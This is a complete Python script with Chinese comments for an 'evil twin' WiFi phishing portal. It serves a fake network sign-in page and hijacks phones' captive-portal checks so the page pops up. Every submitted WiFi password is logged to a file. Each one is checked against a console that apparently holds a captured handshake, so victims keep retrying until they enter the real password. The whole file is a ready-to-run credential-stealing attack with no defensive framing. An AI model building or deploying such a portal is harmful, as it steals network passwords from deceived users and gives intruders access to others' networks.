#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Evil Twin Captive Portal - 运营商认证风格钓鱼页
- 密码 POST 到 /submit 后：先记录，再调用控制台 /api/verify 自动验证
- 验证通过 → 显示"连接成功"（控制台随后自动关闭假 AP）
- 验证失败 → 显示"密码错误，请重新输入"（表单保留可重输）

配置：环境变量 PORTAL_SSID / PORTAL_LOG / CTRL_VERIFY_URL（见 config.env.example）
"""
import os
import http.server
import socketserver
import urllib.parse
import urllib.request
import json

SSID       = os.environ.get("PORTAL_SSID", "YOUR_WIFI_SSID")
LOG        = os.environ.get("PORTAL_LOG", "/opt/evil-twin/passwords.txt")
VERIFY_URL = os.environ.get("CTRL_VERIFY_URL", "http://127.0.0.1:8090/api/verify")
PORT       = 80

PAGE_LOGIN = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi 网络认证</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'PingFang SC','Microsoft YaHei',sans-serif;min-height:100vh;
background:linear-gradient(160deg,#0a5ec7 0%,#1a8af0 55%,#3ea8ff 100%);
display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:20px;padding:36px 30px;width:100%;max-width:400px;
box-shadow:0 20px 60px rgba(0,30,80,.35);text-align:center;animation:fadein .5s ease}
@keyframes fadein{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
.brand{font-size:13px;color:#8a94a6;letter-spacing:2px;margin-bottom:18px}
.brand b{color:#1a8af0}
.wifi-ico{width:74px;height:74px;margin:0 auto 14px;background:linear-gradient(135deg,#1a8af0,#0a5ec7);
border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:34px;color:#fff;
box-shadow:0 8px 24px rgba(26,138,240,.4)}
h2{font-size:20px;color:#1c2430;margin-bottom:6px}
.ssid{font-size:14px;color:#6b7a90;margin-bottom:18px;font-weight:600}
.tip{font-size:13px;color:#8a94a6;margin-bottom:20px}
.err{background:#fdecec;color:#d43d3d;border-radius:10px;padding:10px 12px;font-size:13px;
margin-bottom:16px;display:none}
.err.show{display:block}
form input{width:100%;padding:15px 18px;border:2px solid #e3e9f2;border-radius:12px;font-size:16px;
text-align:center;outline:none;transition:.2s;background:#f7f9fc}
form input:focus{border-color:#1a8af0;background:#fff}
form button{width:100%;padding:15px;background:linear-gradient(135deg,#1a8af0,#0a5ec7);color:#fff;
border:none;border-radius:12px;font-size:16px;font-weight:600;margin-top:14px;cursor:pointer;
box-shadow:0 8px 20px rgba(26,138,240,.35);transition:.2s}
form button:hover{transform:translateY(-1px);box-shadow:0 12px 26px rgba(26,138,240,.45)}
form button:active{transform:none}
.foot{font-size:11px;color:#b4bcc9;margin-top:22px}
</style>
</head>
<body>
<div class="card">
<div class="brand"><b>WiFi</b> · 安全接入认证</div>
<div class="wifi-ico">&#x1F4F6;</div>
<h2>WiFi 网络需要认证</h2>
<div class="ssid" id="ssid">%SSID%</div>
<div class="tip">请输入 WiFi 密码以完成连接</div>
<div class="err" id="err">&#x274C; 密码错误，请重新输入</div>
<form method="POST" action="/submit" id="frm">
<input type="password" name="password" id="pwd" placeholder="请输入 WiFi 密码" autofocus required autocomplete="off">
<button type="submit" id="btn">连 接</button>
</form>
</div>
<script>
if (location.hash === '#err') document.getElementById('err').classList.add('show');
</script>
</body>
</html>"""

PAGE_OK = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>连接成功</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'PingFang SC','Microsoft YaHei',sans-serif;min-height:100vh;
background:linear-gradient(160deg,#0a5ec7,#1a8af0);display:flex;justify-content:center;align-items:center}
.card{background:#fff;border-radius:20px;padding:44px 36px;text-align:center;max-width:380px;width:90%;
box-shadow:0 20px 60px rgba(0,30,80,.35)}
.ok{width:72px;height:72px;margin:0 auto 18px;background:linear-gradient(135deg,#22c55e,#16a34a);
border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:36px;color:#fff;
box-shadow:0 8px 24px rgba(34,197,94,.4)}
h2{font-size:20px;color:#1c2430;margin-bottom:8px}
p{font-size:14px;color:#6b7a90}
.spinner{width:18px;height:18px;border:3px solid #e3e9f2;border-top-color:#22c55e;border-radius:50%;
display:inline-block;vertical-align:-3px;margin-right:6px;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
<div class="ok">&#x2714;</div>
<h2>认证成功</h2>
<p><span class="spinner"></span>正在获取网络配置，请稍候...</p>
</div>
</body>
</html>"""


def verify_password(pwd):
    """调用控制台验证密码是否匹配历史真实握手"""
    try:
        req = urllib.request.Request(
            VERIFY_URL,
            data=json.dumps({"password": pwd}).encode("utf-8"),
            headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            return json.loads(r.read().decode("utf-8"))
    except Exception as e:
        print("verify error: %s" % e, flush=True)
        return None


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        # 系统 captive portal 检测请求（安卓/iOS 自动探测）→ 302 到首页，触发系统弹认证页
        p = self.path.lower()
        if any(k in p for k in ("generate_204", "gen_204", "connectivity", "captive", "hotspot-detect", "success.txt", "ncsi")):
            self.send_response(302)
            self.send_header("Location", "/")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        body = PAGE_LOGIN.replace("%SSID%", SSID).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode("utf-8", "ignore")
        params = urllib.parse.parse_qs(data)
        pwd = params.get("password", ["<empty>"])[0]
        line = "PASSWORD CAPTURED: %s\n" % pwd
        print(line, flush=True)
        with open(LOG, "a") as f:
            f.write(line)

        if pwd and pwd != "<empty>":
            v = verify_password(pwd)
            if v is not None and v.get("ok"):
                body = PAGE_OK.encode("utf-8")
            elif v is not None and not v.get("ok"):
                # 密码错误：重新显示登录页 + 错误提示
                page = PAGE_LOGIN.replace("%SSID%", SSID)
                page = page.replace('<form method="POST" action="/submit" id="frm">',
                                    '<form method="POST" action="/submit" id="frm">\n'
                                    '<div class="err show">&#x274C; 密码错误，请重新输入</div>')
                body = page.encode("utf-8")
            else:
                # 验证服务不可用：不放行，按密码错误处理（严格模式）
                page = PAGE_LOGIN.replace("%SSID%", SSID)
                page = page.replace('<form method="POST" action="/submit" id="frm">',
                                    '<form method="POST" action="/submit" id="frm">\n'
                                    '<div class="err show">&#x274C; 网络繁忙，请稍后重试</div>')
                body = page.encode("utf-8")
        else:
            # 空密码：直接返回错误页
            page = PAGE_LOGIN.replace("%SSID%", SSID)
            page = page.replace('<form method="POST" action="/submit" id="frm">',
                                '<form method="POST" action="/submit" id="frm">\n'
                                '<div class="err show">&#x274C; 密码错误，请重新输入</div>')
            body = page.encode("utf-8")

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
    print("Captive portal listening on port %d" % PORT, flush=True)
    httpd.serve_forever()
